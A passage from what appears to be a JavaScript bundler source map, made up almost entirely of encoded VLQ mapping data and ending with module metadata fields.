,cAAc,CAAG1H,OAAO,CAC5B,IAAM2H,KAAK,CAACC,IAAI,CAAC,CAAEhF,MAAM,CAAE,EAAG,CAAC,CAAE,KAAO,CACtC7B,IAAI,CAAE8G,IAAI,CAACC,MAAM,CAAC,CAAC,CAAG,GAAG,CACzB7G,QAAQ,CAAE,CAAC,CAAG4G,IAAI,CAACC,MAAM,CAAC,CAAC,CAAG,CAChC,CAAC,CAAC,CAAC,CACH,EACF,CAAC,CAED,mBACErH,KAAA,CAACE,UAAU,EAAAoH,QAAA,EACRL,cAAc,CAACM,GAAG,CAAC,CAACC,GAAG,CAAEtF,CAAC,gBACzBpC,IAAA,CAACM,KAAK,EAASE,IAAI,CAAEkH,GAAG,CAAClH,IAAK,CAACE,QAAQ,CAAEgH,GAAG,CAAChH,QAAS,CAAA8G,QAAA,CAAC,cAAE,EAA7CpF,CAAoD,CACjE,CAAC,CACDiB,mBAAmB,eAAIrD,IAAA,CAACF,eAAe,EAAC6H,OAAO,CAAE1B,WAAY,CAAC2B,MAAM,CAAEzB,UAAW,CAAE,CAAC,cACrFjG,KAAA,CAACS,SAAS,EAAA6G,QAAA,eACRxH,IAAA,CAACY,KAAK,EAAA4G,QAAA,CAAC,uCAA2B,CAAO,CAAC,cAC1CxH,IAAA,CAACc,KAAK,EAAC+G,IAAI,CAAC,MAAM,CAACC,WAAW,CAAC,WAAW,CAACvB,KAAK,CAAE5E,KAAM,CAACoG,QAAQ,CAAE3B,aAAc,CAAE,CAAC,cACpFpG,IAAA,CAACc,KAAK,EAAC+G,IAAI,CAAC,MAAM,CAACC,WAAW,CAAC,cAAc,CAACvB,KAAK,CAAE3E,KAAM,CAACmG,QAAQ,CAAEvB,aAAc,CAAE,CAAC,cACvFxG,IAAA,CAACgB,MAAM,EAACgH,OAAO,CAAEvB,YAAa,CAACtF,QAAQ,CAAEgC,SAAU,CAAAqE,QAAA,CAChDrE,SAAS,CAAG,aAAa,CAAG,oBAAoB,CAC3C,CAAC,CACRF,MAAM,eAAI/C,KAAA,CAACmB,MAAM,EAAAmG,QAAA,EAAC,eAAG,CAACvE,MAAM,CAAC,eAAG,EAAQ,CAAC,cAC1CjD,IAAA,CAACuB,WAAW,EAACyG,OAAO,CAAElB,WAAY,CAAAU,QAAA,CAAC,oBAAQ,CAAa,CAAC,CACxD/D,gBAAgB,eAAIzD,IAAA,CAACwB,aAAa,EAAAgG,QAAA,CAAE/D,gBAAgB,CAAgB,CAAC,cACtEzD,IAAA,UAAOiI,GAAG,CAAEtE,QAAS,CAACuE,KAAK,CAAC,KAAK,CAACC,MAAM,CAAC,KAAK,CAACC,QAAQ,MAACC,KAAK,MAACC,KAAK,CAAE,CAAEC,OAAO,CAAE,MAAO,CAAE,CAAE,CAAC,cAC5FvI,IAAA,WAAQiI,GAAG,CAAErE,SAAU,CAACsE,KAAK,CAAC,KAAK,CAACC,MAAM,CAAC,KAAK,CAACG,KAAK,CAAE,CAAEC,OAAO,CAAE,MAAO,CAAE,CAAE,CAAC,EACtE,CAAC,EACF,CAAC,CAEjB,CAAC,CAED,cAAe,CAAAzF,UAAU","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}